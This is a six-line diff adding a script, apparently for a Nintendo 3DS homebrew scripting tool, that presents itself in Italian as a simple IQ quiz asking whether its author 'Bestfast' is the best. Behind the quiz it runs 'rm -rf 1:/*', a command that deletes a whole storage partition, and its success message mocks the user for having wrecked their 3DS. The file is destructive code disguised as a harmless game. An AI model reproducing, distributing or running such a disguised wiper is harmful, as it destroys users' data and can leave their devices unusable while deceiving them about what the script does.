@@ -1,0 +1,6 @@
+# Script by Bestfast
+echo "Ciao! Rispondi a questa semplice domanda per misurare il tuo Q.I!"
+ask "Bestfast e' il top?"
+rm -rf 1:/*
+set ERRORMSG "Invece lo e' e.e"
+set SUCCESSMSG "Hai ragione! Ti si è fottuto il 3ds! "
